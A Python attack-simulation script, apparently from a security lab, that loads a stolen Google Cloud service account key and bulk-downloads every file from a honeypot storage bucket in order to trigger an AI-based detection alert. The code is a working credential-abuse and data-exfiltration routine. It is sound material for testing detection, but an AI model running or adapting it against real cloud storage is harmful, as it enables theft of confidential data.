"""
Attack Simulation Script — Data Exfiltration from Honeypot Bucket
=================================================================
Simulates a threat actor using stolen service account credentials
to bulk-download files from a GCS bucket via Python SDK.

User-Agent will appear as:  gcloud-python/... google-cloud-storage/...
This is clearly an automated/programmatic tool → AI should flag CRITICAL.

Usage:
    pip install google-cloud-storage
    python attack_simulation.py
"""

import os
import tempfile
from google.cloud import storage
from google.oauth2 import service_account

# ── Configuration ──────────────────────────────────────────────────
KEY_FILE = os.path.join(os.path.dirname(__file__), "victim_key.json")
BUCKET_NAME = "secops-lab-confidential-data-b232e290"
DOWNLOAD_DIR = tempfile.mkdtemp(prefix="exfil_")

def main():
    print(f"[*] Loading stolen credentials from: {KEY_FILE}")
    credentials = service_account.Credentials.from_service_account_file(KEY_FILE)

    print(f"[*] Connecting to GCS as: {credentials.service_account_email}")
    client = storage.Client(credentials=credentials, project=credentials.project_id)

    bucket = client.bucket(BUCKET_NAME)
    blobs = list(bucket.list_blobs())
    print(f"[*] Found {len(blobs)} files in bucket: {BUCKET_NAME}")
    print(f"[*] Downloading to: {DOWNLOAD_DIR}")
    print()

    for i, blob in enumerate(blobs, 1):
        dest = os.path.join(DOWNLOAD_DIR, blob.name.replace("/", "_"))
        blob.download_to_filename(dest)
        size = os.path.getsize(dest)
        print(f"  [{i:3d}/{len(blobs)}] {blob.name} ({size:,} bytes)")

    print()
    print(f"[✓] Exfiltration complete: {len(blobs)} files downloaded")
    print(f"[✓] Data saved to: {DOWNLOAD_DIR}")

if __name__ == "__main__":
    main()
